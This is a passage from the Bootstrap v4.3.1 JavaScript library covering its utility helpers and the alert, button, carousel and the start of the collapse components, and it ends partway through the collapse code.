/*!
  * Bootstrap v4.3.1 (https://getbootstrap.com/)
  * Copyright 2011-2019 The Bootstrap Authors (https://github.com/twbs/bootstrap/graphs/contributors)
  * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)
  */
(function (global, factory) {
  typeof exports === 'object' && typeof module !== 'undefined' ? factory(exports, require('jquery'), require('popper.js')) :
    typeof define === 'function' && define.amd ? define(['exports', 'jquery', 'popper.js'], factory) :
      (global = global || self, factory(global.bootstrap = {}, global.jQuery, global.Popper));
}(this, function (exports, $, Popper) {
  'use strict';

  $ = $ && $.hasOwnProperty('default') ? $['default'] : $;
  Popper = Popper && Popper.hasOwnProperty('default') ? Popper['default'] : Popper;

  function _defineProperties(target, props) {
    for (var i = 0; i < props.length; i++) {
      var descriptor = props[i];
      descriptor.enumerable = descriptor.enumerable || false;
      descriptor.configurable = true;
      if ("value" in descriptor) descriptor.writable = true;
      Object.defineProperty(target, descriptor.key, descriptor);
    }
  }

  function _createClass(Constructor, protoProps, staticProps) {
    if (protoProps) _defineProperties(Constructor.prototype, protoProps);
    if (staticProps) _defineProperties(Constructor, staticProps);
    return Constructor;
  }

  function _defineProperty(obj, key, value) {
    if (key in obj) {
      Object.defineProperty(obj, key, {
        value: value,
        enumerable: true,
        configurable: true,
        writable: true
      });
    } else {
      obj[key] = value;
    }

    return obj;
  }

  function _objectSpread(target) {
    for (var i = 1; i < arguments.length; i++) {
      var source = arguments[i] != null ? arguments[i] : {};
      var ownKeys = Object.keys(source);

      if (typeof Object.getOwnPropertySymbols === 'function') {
        ownKeys = ownKeys.concat(Object.getOwnPropertySymbols(source).filter(function (sym) {
          return Object.getOwnPropertyDescriptor(source, sym).enumerable;
        }));
      }

      ownKeys.forEach(function (key) {
        _defineProperty(target, key, source[key]);
      });
    }

    return target;
  }

  function _inheritsLoose(subClass, superClass) {
    subClass.prototype = Object.create(superClass.prototype);
    subClass.prototype.constructor = subClass;
    subClass.__proto__ = superClass;
  }

  /**
   * --------------------------------------------------------------------------
   * Bootstrap (v4.3.1): util.js
   * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)
   * --------------------------------------------------------------------------
   */
  /**
   * ------------------------------------------------------------------------
   * Private TransitionEnd Helpers
   * ------------------------------------------------------------------------
   */

  var TRANSITION_END = 'transitionend';
  var MAX_UID = 1000000;
  var MILLISECONDS_MULTIPLIER = 1000; // Shoutout AngusCroll (https://goo.gl/pxwQGp)

  function toType(obj) {
    return {}.toString.call(obj).match(/\s([a-z]+)/i)[1].toLowerCase();
  }

  function getSpecialTransitionEndEvent() {
    return {
      bindType: TRANSITION_END,
      delegateType: TRANSITION_END,
      handle: function handle(event) {
        if ($(event.target).is(this)) {
          return event.handleObj.handler.apply(this, arguments); // eslint-disable-line prefer-rest-params
        }

        return undefined; // eslint-disable-line no-undefined
      }
    };
  }

  function transitionEndEmulator(duration) {
    var _this = this;

    var called = false;
    $(this).one(Util.TRANSITION_END, function () {
      called = true;
    });
    setTimeout(function () {
      if (!called) {
        Util.triggerTransitionEnd(_this);
      }
    }, duration);
    return this;
  }

  function setTransitionEndSupport() {
    $.fn.emulateTransitionEnd = transitionEndEmulator;
    $.event.special[Util.TRANSITION_END] = getSpecialTransitionEndEvent();
  }
  /**
   * --------------------------------------------------------------------------
   * Public Util Api
   * --------------------------------------------------------------------------
   */


  var Util = {
    TRANSITION_END: 'bsTransitionEnd',
    getUID: function getUID(prefix) {
      do {
        // eslint-disable-next-line no-bitwise
        prefix += ~~(Math.random() * MAX_UID); // "~~" acts like a faster Math.floor() here
      } while (document.getElementById(prefix));

      return prefix;
    },
    getSelectorFromElement: function getSelectorFromElement(element) {
      var selector = element.getAttribute('data-target');

      if (!selector || selector === '#') {
        var hrefAttr = element.getAttribute('href');
        selector = hrefAttr && hrefAttr !== '#' ? hrefAttr.trim() : '';
      }

      try {
        return document.querySelector(selector) ? selector : null;
      } catch (err) {
        return null;
      }
    },
    getTransitionDurationFromElement: function getTransitionDurationFromElement(element) {
      if (!element) {
        return 0;
      } // Get transition-duration of the element


      var transitionDuration = $(element).css('transition-duration');
      var transitionDelay = $(element).css('transition-delay');
      var floatTransitionDuration = parseFloat(transitionDuration);
      var floatTransitionDelay = parseFloat(transitionDelay); // Return 0 if element or transition duration is not found

      if (!floatTransitionDuration && !floatTransitionDelay) {
        return 0;
      } // If multiple durations are defined, take the first


      transitionDuration = transitionDuration.split(',')[0];
      transitionDelay = transitionDelay.split(',')[0];
      return (parseFloat(transitionDuration) + parseFloat(transitionDelay)) * MILLISECONDS_MULTIPLIER;
    },
    reflow: function reflow(element) {
      return element.offsetHeight;
    },
    triggerTransitionEnd: function triggerTransitionEnd(element) {
      $(element).trigger(TRANSITION_END);
    },
    // TODO: Remove in v5
    supportsTransitionEnd: function supportsTransitionEnd() {
      return Boolean(TRANSITION_END);
    },
    isElement: function isElement(obj) {
      return (obj[0] || obj).nodeType;
    },
    typeCheckConfig: function typeCheckConfig(componentName, config, configTypes) {
      for (var property in configTypes) {
        if (Object.prototype.hasOwnProperty.call(configTypes, property)) {
          var expectedTypes = configTypes[property];
          var value = config[property];
          var valueType = value && Util.isElement(value) ? 'element' : toType(value);

          if (!new RegExp(expectedTypes).test(valueType)) {
            throw new Error(componentName.toUpperCase() + ": " + ("Option \"" + property + "\" provided type \"" + valueType + "\" ") + ("but expected type \"" + expectedTypes + "\"."));
          }
        }
      }
    },
    findShadowRoot: function findShadowRoot(element) {
      if (!document.documentElement.attachShadow) {
        return null;
      } // Can find the shadow root otherwise it'll return the document


      if (typeof element.getRootNode === 'function') {
        var root = element.getRootNode();
        return root instanceof ShadowRoot ? root : null;
      }

      if (element instanceof ShadowRoot) {
        return element;
      } // when we don't find a shadow root


      if (!element.parentNode) {
        return null;
      }

      return Util.findShadowRoot(element.parentNode);
    }
  };
  setTransitionEndSupport();

  /**
   * ------------------------------------------------------------------------
   * Constants
   * ------------------------------------------------------------------------
   */

  var NAME = 'alert';
  var VERSION = '4.3.1';
  var DATA_KEY = 'bs.alert';
  var EVENT_KEY = "." + DATA_KEY;
  var DATA_API_KEY = '.data-api';
  var JQUERY_NO_CONFLICT = $.fn[NAME];
  var Selector = {
    DISMISS: '[data-dismiss="alert"]'
  };
  var Event = {
    CLOSE: "close" + EVENT_KEY,
    CLOSED: "closed" + EVENT_KEY,
    CLICK_DATA_API: "click" + EVENT_KEY + DATA_API_KEY
  };
  var ClassName = {
    ALERT: 'alert',
    FADE: 'fade',
    SHOW: 'show'
    /**
     * ------------------------------------------------------------------------
     * Class Definition
     * ------------------------------------------------------------------------
     */

  };

  var Alert =
    /*#__PURE__*/
    function () {
      function Alert(element) {
        this._element = element;
      } // Getters


      var _proto = Alert.prototype;

      // Public
      _proto.close = function close(element) {
        var rootElement = this._element;

        if (element) {
          rootElement = this._getRootElement(element);
        }

        var customEvent = this._triggerCloseEvent(rootElement);

        if (customEvent.isDefaultPrevented()) {
          return;
        }

        this._removeElement(rootElement);
      };

      _proto.dispose = function dispose() {
        $.removeData(this._element, DATA_KEY);
        this._element = null;
      } // Private
        ;

      _proto._getRootElement = function _getRootElement(element) {
        var selector = Util.getSelectorFromElement(element);
        var parent = false;

        if (selector) {
          parent = document.querySelector(selector);
        }

        if (!parent) {
          parent = $(element).closest("." + ClassName.ALERT)[0];
        }

        return parent;
      };

      _proto._triggerCloseEvent = function _triggerCloseEvent(element) {
        var closeEvent = $.Event(Event.CLOSE);
        $(element).trigger(closeEvent);
        return closeEvent;
      };

      _proto._removeElement = function _removeElement(element) {
        var _this = this;

        $(element).removeClass(ClassName.SHOW);

        if (!$(element).hasClass(ClassName.FADE)) {
          this._destroyElement(element);

          return;
        }

        var transitionDuration = Util.getTransitionDurationFromElement(element);
        $(element).one(Util.TRANSITION_END, function (event) {
          return _this._destroyElement(element, event);
        }).emulateTransitionEnd(transitionDuration);
      };

      _proto._destroyElement = function _destroyElement(element) {
        $(element).detach().trigger(Event.CLOSED).remove();
      } // Static
        ;

      Alert._jQueryInterface = function _jQueryInterface(config) {
        return this.each(function () {
          var $element = $(this);
          var data = $element.data(DATA_KEY);

          if (!data) {
            data = new Alert(this);
            $element.data(DATA_KEY, data);
          }

          if (config === 'close') {
            data[config](this);
          }
        });
      };

      Alert._handleDismiss = function _handleDismiss(alertInstance) {
        return function (event) {
          if (event) {
            event.preventDefault();
          }

          alertInstance.close(this);
        };
      };

      _createClass(Alert, null, [{
        key: "VERSION",
        get: function get() {
          return VERSION;
        }
      }]);

      return Alert;
    }();
  /**
   * ------------------------------------------------------------------------
   * Data Api implementation
   * ------------------------------------------------------------------------
   */


  $(document).on(Event.CLICK_DATA_API, Selector.DISMISS, Alert._handleDismiss(new Alert()));
  /**
   * ------------------------------------------------------------------------
   * jQuery
   * ------------------------------------------------------------------------
   */

  $.fn[NAME] = Alert._jQueryInterface;
  $.fn[NAME].Constructor = Alert;

  $.fn[NAME].noConflict = function () {
    $.fn[NAME] = JQUERY_NO_CONFLICT;
    return Alert._jQueryInterface;
  };

  /**
   * ------------------------------------------------------------------------
   * Constants
   * ------------------------------------------------------------------------
   */

  var NAME$1 = 'button';
  var VERSION$1 = '4.3.1';
  var DATA_KEY$1 = 'bs.button';
  var EVENT_KEY$1 = "." + DATA_KEY$1;
  var DATA_API_KEY$1 = '.data-api';
  var JQUERY_NO_CONFLICT$1 = $.fn[NAME$1];
  var ClassName$1 = {
    ACTIVE: 'active',
    BUTTON: 'btn',
    FOCUS: 'focus'
  };
  var Selector$1 = {
    DATA_TOGGLE_CARROT: '[data-toggle^="button"]',
    DATA_TOGGLE: '[data-toggle="buttons"]',
    INPUT: 'input:not([type="hidden"])',
    ACTIVE: '.active',
    BUTTON: '.btn'
  };
  var Event$1 = {
    CLICK_DATA_API: "click" + EVENT_KEY$1 + DATA_API_KEY$1,
    FOCUS_BLUR_DATA_API: "focus" + EVENT_KEY$1 + DATA_API_KEY$1 + " " + ("blur" + EVENT_KEY$1 + DATA_API_KEY$1)
    /**
     * ------------------------------------------------------------------------
     * Class Definition
     * ------------------------------------------------------------------------
     */

  };

  var Button =
    /*#__PURE__*/
    function () {
      function Button(element) {
        this._element = element;
      } // Getters


      var _proto = Button.prototype;

      // Public
      _proto.toggle = function toggle() {
        var triggerChangeEvent = true;
        var addAriaPressed = true;
        var rootElement = $(this._element).closest(Selector$1.DATA_TOGGLE)[0];

        if (rootElement) {
          var input = this._element.querySelector(Selector$1.INPUT);

          if (input) {
            if (input.type === 'radio') {
              if (input.checked && this._element.classList.contains(ClassName$1.ACTIVE)) {
                triggerChangeEvent = false;
              } else {
                var activeElement = rootElement.querySelector(Selector$1.ACTIVE);

                if (activeElement) {
                  $(activeElement).removeClass(ClassName$1.ACTIVE);
                }
              }
            }

            if (triggerChangeEvent) {
              if (input.hasAttribute('disabled') || rootElement.hasAttribute('disabled') || input.classList.contains('disabled') || rootElement.classList.contains('disabled')) {
                return;
              }

              input.checked = !this._element.classList.contains(ClassName$1.ACTIVE);
              $(input).trigger('change');
            }

            input.focus();
            addAriaPressed = false;
          }
        }

        if (addAriaPressed) {
          this._element.setAttribute('aria-pressed', !this._element.classList.contains(ClassName$1.ACTIVE));
        }

        if (triggerChangeEvent) {
          $(this._element).toggleClass(ClassName$1.ACTIVE);
        }
      };

      _proto.dispose = function dispose() {
        $.removeData(this._element, DATA_KEY$1);
        this._element = null;
      } // Static
        ;

      Button._jQueryInterface = function _jQueryInterface(config) {
        return this.each(function () {
          var data = $(this).data(DATA_KEY$1);

          if (!data) {
            data = new Button(this);
            $(this).data(DATA_KEY$1, data);
          }

          if (config === 'toggle') {
            data[config]();
          }
        });
      };

      _createClass(Button, null, [{
        key: "VERSION",
        get: function get() {
          return VERSION$1;
        }
      }]);

      return Button;
    }();
  /**
   * ------------------------------------------------------------------------
   * Data Api implementation
   * ------------------------------------------------------------------------
   */


  $(document).on(Event$1.CLICK_DATA_API, Selector$1.DATA_TOGGLE_CARROT, function (event) {
    event.preventDefault();
    var button = event.target;

    if (!$(button).hasClass(ClassName$1.BUTTON)) {
      button = $(button).closest(Selector$1.BUTTON);
    }

    Button._jQueryInterface.call($(button), 'toggle');
  }).on(Event$1.FOCUS_BLUR_DATA_API, Selector$1.DATA_TOGGLE_CARROT, function (event) {
    var button = $(event.target).closest(Selector$1.BUTTON)[0];
    $(button).toggleClass(ClassName$1.FOCUS, /^focus(in)?$/.test(event.type));
  });
  /**
   * ------------------------------------------------------------------------
   * jQuery
   * ------------------------------------------------------------------------
   */

  $.fn[NAME$1] = Button._jQueryInterface;
  $.fn[NAME$1].Constructor = Button;

  $.fn[NAME$1].noConflict = function () {
    $.fn[NAME$1] = JQUERY_NO_CONFLICT$1;
    return Button._jQueryInterface;
  };

  /**
   * ------------------------------------------------------------------------
   * Constants
   * ------------------------------------------------------------------------
   */

  var NAME$2 = 'carousel';
  var VERSION$2 = '4.3.1';
  var DATA_KEY$2 = 'bs.carousel';
  var EVENT_KEY$2 = "." + DATA_KEY$2;
  var DATA_API_KEY$2 = '.data-api';
  var JQUERY_NO_CONFLICT$2 = $.fn[NAME$2];
  var ARROW_LEFT_KEYCODE = 37; // KeyboardEvent.which value for left arrow key

  var ARROW_RIGHT_KEYCODE = 39; // KeyboardEvent.which value for right arrow key

  var TOUCHEVENT_COMPAT_WAIT = 500; // Time for mouse compat events to fire after touch

  var SWIPE_THRESHOLD = 40;
  var Default = {
    interval: 5000,
    keyboard: true,
    slide: false,
    pause: 'hover',
    wrap: true,
    touch: true
  };
  var DefaultType = {
    interval: '(number|boolean)',
    keyboard: 'boolean',
    slide: '(boolean|string)',
    pause: '(string|boolean)',
    wrap: 'boolean',
    touch: 'boolean'
  };
  var Direction = {
    NEXT: 'next',
    PREV: 'prev',
    LEFT: 'left',
    RIGHT: 'right'
  };
  var Event$2 = {
    SLIDE: "slide" + EVENT_KEY$2,
    SLID: "slid" + EVENT_KEY$2,
    KEYDOWN: "keydown" + EVENT_KEY$2,
    MOUSEENTER: "mouseenter" + EVENT_KEY$2,
    MOUSELEAVE: "mouseleave" + EVENT_KEY$2,
    TOUCHSTART: "touchstart" + EVENT_KEY$2,
    TOUCHMOVE: "touchmove" + EVENT_KEY$2,
    TOUCHEND: "touchend" + EVENT_KEY$2,
    POINTERDOWN: "pointerdown" + EVENT_KEY$2,
    POINTERUP: "pointerup" + EVENT_KEY$2,
    DRAG_START: "dragstart" + EVENT_KEY$2,
    LOAD_DATA_API: "load" + EVENT_KEY$2 + DATA_API_KEY$2,
    CLICK_DATA_API: "click" + EVENT_KEY$2 + DATA_API_KEY$2
  };
  var ClassName$2 = {
    CAROUSEL: 'carousel',
    ACTIVE: 'active',
    SLIDE: 'slide',
    RIGHT: 'carousel-item-right',
    LEFT: 'carousel-item-left',
    NEXT: 'carousel-item-next',
    PREV: 'carousel-item-prev',
    ITEM: 'carousel-item',
    POINTER_EVENT: 'pointer-event'
  };
  var Selector$2 = {
    ACTIVE: '.active',
    ACTIVE_ITEM: '.active.carousel-item',
    ITEM: '.carousel-item',
    ITEM_IMG: '.carousel-item img',
    NEXT_PREV: '.carousel-item-next, .carousel-item-prev',
    INDICATORS: '.carousel-indicators',
    DATA_SLIDE: '[data-slide], [data-slide-to]',
    DATA_RIDE: '[data-ride="carousel"]'
  };
  var PointerType = {
    TOUCH: 'touch',
    PEN: 'pen'
    /**
     * ------------------------------------------------------------------------
     * Class Definition
     * ------------------------------------------------------------------------
     */

  };

  var Carousel =
    /*#__PURE__*/
    function () {
      function Carousel(element, config) {
        this._items = null;
        this._interval = null;
        this._activeElement = null;
        this._isPaused = false;
        this._isSliding = false;
        this.touchTimeout = null;
        this.touchStartX = 0;
        this.touchDeltaX = 0;
        this._config = this._getConfig(config);
        this._element = element;
        this._indicatorsElement = this._element.querySelector(Selector$2.INDICATORS);
        this._touchSupported = 'ontouchstart' in document.documentElement || navigator.maxTouchPoints > 0;
        this._pointerEvent = Boolean(window.PointerEvent || window.MSPointerEvent);

        this._addEventListeners();
      } // Getters


      var _proto = Carousel.prototype;

      // Public
      _proto.next = function next() {
        if (!this._isSliding) {
          this._slide(Direction.NEXT);
        }
      };

      _proto.nextWhenVisible = function nextWhenVisible() {
        // Don't call next when the page isn't visible
        // or the carousel or its parent isn't visible
        if (!document.hidden && $(this._element).is(':visible') && $(this._element).css('visibility') !== 'hidden') {
          this.next();
        }
      };

      _proto.prev = function prev() {
        if (!this._isSliding) {
          this._slide(Direction.PREV);
        }
      };

      _proto.pause = function pause(event) {
        if (!event) {
          this._isPaused = true;
        }

        if (this._element.querySelector(Selector$2.NEXT_PREV)) {
          Util.triggerTransitionEnd(this._element);
          this.cycle(true);
        }

        clearInterval(this._interval);
        this._interval = null;
      };

      _proto.cycle = function cycle(event) {
        if (!event) {
          this._isPaused = false;
        }

        if (this._interval) {
          clearInterval(this._interval);
          this._interval = null;
        }

        if (this._config.interval && !this._isPaused) {
          this._interval = setInterval((document.visibilityState ? this.nextWhenVisible : this.next).bind(this), this._config.interval);
        }
      };

      _proto.to = function to(index) {
        var _this = this;

        this._activeElement = this._element.querySelector(Selector$2.ACTIVE_ITEM);

        var activeIndex = this._getItemIndex(this._activeElement);

        if (index > this._items.length - 1 || index < 0) {
          return;
        }

        if (this._isSliding) {
          $(this._element).one(Event$2.SLID, function () {
            return _this.to(index);
          });
          return;
        }

        if (activeIndex === index) {
          this.pause();
          this.cycle();
          return;
        }

        var direction = index > activeIndex ? Direction.NEXT : Direction.PREV;

        this._slide(direction, this._items[index]);
      };

      _proto.dispose = function dispose() {
        $(this._element).off(EVENT_KEY$2);
        $.removeData(this._element, DATA_KEY$2);
        this._items = null;
        this._config = null;
        this._element = null;
        this._interval = null;
        this._isPaused = null;
        this._isSliding = null;
        this._activeElement = null;
        this._indicatorsElement = null;
      } // Private
        ;

      _proto._getConfig = function _getConfig(config) {
        config = _objectSpread({}, Default, config);
        Util.typeCheckConfig(NAME$2, config, DefaultType);
        return config;
      };

      _proto._handleSwipe = function _handleSwipe() {
        var absDeltax = Math.abs(this.touchDeltaX);

        if (absDeltax <= SWIPE_THRESHOLD) {
          return;
        }

        var direction = absDeltax / this.touchDeltaX; // swipe left

        if (direction > 0) {
          this.prev();
        } // swipe right


        if (direction < 0) {
          this.next();
        }
      };

      _proto._addEventListeners = function _addEventListeners() {
        var _this2 = this;

        if (this._config.keyboard) {
          $(this._element).on(Event$2.KEYDOWN, function (event) {
            return _this2._keydown(event);
          });
        }

        if (this._config.pause === 'hover') {
          $(this._element).on(Event$2.MOUSEENTER, function (event) {
            return _this2.pause(event);
          }).on(Event$2.MOUSELEAVE, function (event) {
            return _this2.cycle(event);
          });
        }

        if (this._config.touch) {
          this._addTouchEventListeners();
        }
      };

      _proto._addTouchEventListeners = function _addTouchEventListeners() {
        var _this3 = this;

        if (!this._touchSupported) {
          return;
        }

        var start = function start(event) {
          if (_this3._pointerEvent && PointerType[event.originalEvent.pointerType.toUpperCase()]) {
            _this3.touchStartX = event.originalEvent.clientX;
          } else if (!_this3._pointerEvent) {
            _this3.touchStartX = event.originalEvent.touches[0].clientX;
          }
        };

        var move = function move(event) {
          // ensure swiping with one touch and not pinching
          if (event.originalEvent.touches && event.originalEvent.touches.length > 1) {
            _this3.touchDeltaX = 0;
          } else {
            _this3.touchDeltaX = event.originalEvent.touches[0].clientX - _this3.touchStartX;
          }
        };

        var end = function end(event) {
          if (_this3._pointerEvent && PointerType[event.originalEvent.pointerType.toUpperCase()]) {
            _this3.touchDeltaX = event.originalEvent.clientX - _this3.touchStartX;
          }

          _this3._handleSwipe();

          if (_this3._config.pause === 'hover') {
            // If it's a touch-enabled device, mouseenter/leave are fired as
            // part of the mouse compatibility events on first tap - the carousel
            // would stop cycling until user tapped out of it;
            // here, we listen for touchend, explicitly pause the carousel
            // (as if it's the second time we tap on it, mouseenter compat event
            // is NOT fired) and after a timeout (to allow for mouse compatibility
            // events to fire) we explicitly restart cycling
            _this3.pause();

            if (_this3.touchTimeout) {
              clearTimeout(_this3.touchTimeout);
            }

            _this3.touchTimeout = setTimeout(function (event) {
              return _this3.cycle(event);
            }, TOUCHEVENT_COMPAT_WAIT + _this3._config.interval);
          }
        };

        $(this._element.querySelectorAll(Selector$2.ITEM_IMG)).on(Event$2.DRAG_START, function (e) {
          return e.preventDefault();
        });

        if (this._pointerEvent) {
          $(this._element).on(Event$2.POINTERDOWN, function (event) {
            return start(event);
          });
          $(this._element).on(Event$2.POINTERUP, function (event) {
            return end(event);
          });

          this._element.classList.add(ClassName$2.POINTER_EVENT);
        } else {
          $(this._element).on(Event$2.TOUCHSTART, function (event) {
            return start(event);
          });
          $(this._element).on(Event$2.TOUCHMOVE, function (event) {
            return move(event);
          });
          $(this._element).on(Event$2.TOUCHEND, function (event) {
            return end(event);
          });
        }
      };

      _proto._keydown = function _keydown(event) {
        if (/input|textarea/i.test(event.target.tagName)) {
          return;
        }

        switch (event.which) {
          case ARROW_LEFT_KEYCODE:
            event.preventDefault();
            this.prev();
            break;

          case ARROW_RIGHT_KEYCODE:
            event.preventDefault();
            this.next();
            break;

          default:
        }
      };

      _proto._getItemIndex = function _getItemIndex(element) {
        this._items = element && element.parentNode ? [].slice.call(element.parentNode.querySelectorAll(Selector$2.ITEM)) : [];
        return this._items.indexOf(element);
      };

      _proto._getItemByDirection = function _getItemByDirection(direction, activeElement) {
        var isNextDirection = direction === Direction.NEXT;
        var isPrevDirection = direction === Direction.PREV;

        var activeIndex = this._getItemIndex(activeElement);

        var lastItemIndex = this._items.length - 1;
        var isGoingToWrap = isPrevDirection && activeIndex === 0 || isNextDirection && activeIndex === lastItemIndex;

        if (isGoingToWrap && !this._config.wrap) {
          return activeElement;
        }

        var delta = direction === Direction.PREV ? -1 : 1;
        var itemIndex = (activeIndex + delta) % this._items.length;
        return itemIndex === -1 ? this._items[this._items.length - 1] : this._items[itemIndex];
      };

      _proto._triggerSlideEvent = function _triggerSlideEvent(relatedTarget, eventDirectionName) {
        var targetIndex = this._getItemIndex(relatedTarget);

        var fromIndex = this._getItemIndex(this._element.querySelector(Selector$2.ACTIVE_ITEM));

        var slideEvent = $.Event(Event$2.SLIDE, {
          relatedTarget: relatedTarget,
          direction: eventDirectionName,
          from: fromIndex,
          to: targetIndex
        });
        $(this._element).trigger(slideEvent);
        return slideEvent;
      };

      _proto._setActiveIndicatorElement = function _setActiveIndicatorElement(element) {
        if (this._indicatorsElement) {
          var indicators = [].slice.call(this._indicatorsElement.querySelectorAll(Selector$2.ACTIVE));
          $(indicators).removeClass(ClassName$2.ACTIVE);

          var nextIndicator = this._indicatorsElement.children[this._getItemIndex(element)];

          if (nextIndicator) {
            $(nextIndicator).addClass(ClassName$2.ACTIVE);
          }
        }
      };

      _proto._slide = function _slide(direction, element) {
        var _this4 = this;

        var activeElement = this._element.querySelector(Selector$2.ACTIVE_ITEM);

        var activeElementIndex = this._getItemIndex(activeElement);

        var nextElement = element || activeElement && this._getItemByDirection(direction, activeElement);

        var nextElementIndex = this._getItemIndex(nextElement);

        var isCycling = Boolean(this._interval);
        var directionalClassName;
        var orderClassName;
        var eventDirectionName;

        if (direction === Direction.NEXT) {
          directionalClassName = ClassName$2.LEFT;
          orderClassName = ClassName$2.NEXT;
          eventDirectionName = Direction.LEFT;
        } else {
          directionalClassName = ClassName$2.RIGHT;
          orderClassName = ClassName$2.PREV;
          eventDirectionName = Direction.RIGHT;
        }

        if (nextElement && $(nextElement).hasClass(ClassName$2.ACTIVE)) {
          this._isSliding = false;
          return;
        }

        var slideEvent = this._triggerSlideEvent(nextElement, eventDirectionName);

        if (slideEvent.isDefaultPrevented()) {
          return;
        }

        if (!activeElement || !nextElement) {
          // Some weirdness is happening, so we bail
          return;
        }

        this._isSliding = true;

        if (isCycling) {
          this.pause();
        }

        this._setActiveIndicatorElement(nextElement);

        var slidEvent = $.Event(Event$2.SLID, {
          relatedTarget: nextElement,
          direction: eventDirectionName,
          from: activeElementIndex,
          to: nextElementIndex
        });

        if ($(this._element).hasClass(ClassName$2.SLIDE)) {
          $(nextElement).addClass(orderClassName);
          Util.reflow(nextElement);
          $(activeElement).addClass(directionalClassName);
          $(nextElement).addClass(directionalClassName);
          var nextElementInterval = parseInt(nextElement.getAttribute('data-interval'), 10);

          if (nextElementInterval) {
            this._config.defaultInterval = this._config.defaultInterval || this._config.interval;
            this._config.interval = nextElementInterval;
          } else {
            this._config.interval = this._config.defaultInterval || this._config.interval;
          }

          var transitionDuration = Util.getTransitionDurationFromElement(activeElement);
          $(activeElement).one(Util.TRANSITION_END, function () {
            $(nextElement).removeClass(directionalClassName + " " + orderClassName).addClass(ClassName$2.ACTIVE);
            $(activeElement).removeClass(ClassName$2.ACTIVE + " " + orderClassName + " " + directionalClassName);
            _this4._isSliding = false;
            setTimeout(function () {
              return $(_this4._element).trigger(slidEvent);
            }, 0);
          }).emulateTransitionEnd(transitionDuration);
        } else {
          $(activeElement).removeClass(ClassName$2.ACTIVE);
          $(nextElement).addClass(ClassName$2.ACTIVE);
          this._isSliding = false;
          $(this._element).trigger(slidEvent);
        }

        if (isCycling) {
          this.cycle();
        }
      } // Static
        ;

      Carousel._jQueryInterface = function _jQueryInterface(config) {
        return this.each(function () {
          var data = $(this).data(DATA_KEY$2);

          var _config = _objectSpread({}, Default, $(this).data());

          if (typeof config === 'object') {
            _config = _objectSpread({}, _config, config);
          }

          var action = typeof config === 'string' ? config : _config.slide;

          if (!data) {
            data = new Carousel(this, _config);
            $(this).data(DATA_KEY$2, data);
          }

          if (typeof config === 'number') {
            data.to(config);
          } else if (typeof action === 'string') {
            if (typeof data[action] === 'undefined') {
              throw new TypeError("No method named \"" + action + "\"");
            }

            data[action]();
          } else if (_config.interval && _config.ride) {
            data.pause();
            data.cycle();
          }
        });
      };

      Carousel._dataApiClickHandler = function _dataApiClickHandler(event) {
        var selector = Util.getSelectorFromElement(this);

        if (!selector) {
          return;
        }

        var target = $(selector)[0];

        if (!target || !$(target).hasClass(ClassName$2.CAROUSEL)) {
          return;
        }

        var config = _objectSpread({}, $(target).data(), $(this).data());

        var slideIndex = this.getAttribute('data-slide-to');

        if (slideIndex) {
          config.interval = false;
        }

        Carousel._jQueryInterface.call($(target), config);

        if (slideIndex) {
          $(target).data(DATA_KEY$2).to(slideIndex);
        }

        event.preventDefault();
      };

      _createClass(Carousel, null, [{
        key: "VERSION",
        get: function get() {
          return VERSION$2;
        }
      }, {
        key: "Default",
        get: function get() {
          return Default;
        }
      }]);

      return Carousel;
    }();
  /**
   * ------------------------------------------------------------------------
   * Data Api implementation
   * ------------------------------------------------------------------------
   */


  $(document).on(Event$2.CLICK_DATA_API, Selector$2.DATA_SLIDE, Carousel._dataApiClickHandler);
  $(window).on(Event$2.LOAD_DATA_API, function () {
    var carousels = [].slice.call(document.querySelectorAll(Selector$2.DATA_RIDE));

    for (var i = 0, len = carousels.length; i < len; i++) {
      var $carousel = $(carousels[i]);

      Carousel._jQueryInterface.call($carousel, $carousel.data());
    }
  });
  /**
   * ------------------------------------------------------------------------
   * jQuery
   * ------------------------------------------------------------------------
   */

  $.fn[NAME$2] = Carousel._jQueryInterface;
  $.fn[NAME$2].Constructor = Carousel;

  $.fn[NAME$2].noConflict = function () {
    $.fn[NAME$2] = JQUERY_NO_CONFLICT$2;
    return Carousel._jQueryInterface;
  };

  /**
   * ------------------------------------------------------------------------
   * Constants
   * ------------------------------------------------------------------------
   */

  var NAME$3 = 'collapse';
  var VERSION$3 = '4.3.1';
  var DATA_KEY$3 = 'bs.collapse';
  var EVENT_KEY$3 = "." + DATA_KEY$3;
  var DATA_API_KEY$3 = '.data-api';
  var JQUERY_NO_CONFLICT$3 = $.fn[NAME$3];
  var Default$1 = {
    toggle: true,
    parent: ''
  };
  var DefaultType$1 = {
    toggle: 'boolean',
    parent: '(string|element)'
  };
  var Event$3 = {
    SHOW: "show" + EVENT_KEY$3,
    SHOWN: "shown" + EVENT_KEY$3,
    HIDE: "hide" + EVENT_KEY$3,
    HIDDEN: "hidden" + EVENT_KEY$3,
    CLICK_DATA_API: "click" + EVENT_KEY$3 + DATA_API_KEY$3
  };
  var ClassName$3 = {
    SHOW: 'show',
    COLLAPSE: 'collapse',
    COLLAPSING: 'collapsing',
    COLLAPSED: 'collapsed'
  };
  var Dimension = {
    WIDTH: 'width',
    HEIGHT: 'height'
  };
  var Selector$3 = {
    ACTIVES: '.show, .collapsing',
    DATA_TOGGLE: '[data-toggle="collapse"]'
    /**
     * ------------------------------------------------------------------------
     * Class Definition
     * ------------------------------------------------------------------------
     */

  };

  var Collapse =
    /*#__PURE__*/
    function () {
      function Collapse(element, config) {
        this._isTransitioning = false;
        this._element = element;
        this._config = this._getConfig(config);
        this._triggerArray = [].slice.call(document.querySelectorAll("[data-toggle=\"collapse\"][href=\"#" + element.id + "\"]," + ("[data-toggle=\"collapse\"][data-target=\"#" + element.id + "\"]")));
        var toggleList = [].slice.call(document.querySelectorAll(Selector$3.DATA_TOGGLE));

        for (var i = 0, len = toggleList.length; i < len; i++) {
          var elem = toggleList[i];
          var selector = Util.getSelectorFromElement(elem);
          var filterElement = [].slice.call(document.querySelectorAll(selector)).filter(function (foundElem) {
            return foundElem === element;
          });

          if (selector !== null && filterElement.length > 0) {
            this._selector = selector;

            this._triggerArray.push(elem);
          }
        }

        this._parent = this._config.parent ? this._getParent() : null;

        if (!this._config.parent) {
          this._addAriaAndCollapsedClass(this._element, this._triggerArray);
        }

        if (this._config.toggle) {
          this.toggle();
        }
      } // Getters


      var _proto = Collapse.prototype;

      // Public
      _proto.toggle = function toggle() {
        if ($(this._element).hasClass(ClassName$3.SHOW)) {
          this.hide();
        } else {
          this.show();
        }
      };

      _proto.show = function show() {
        var _this = this;

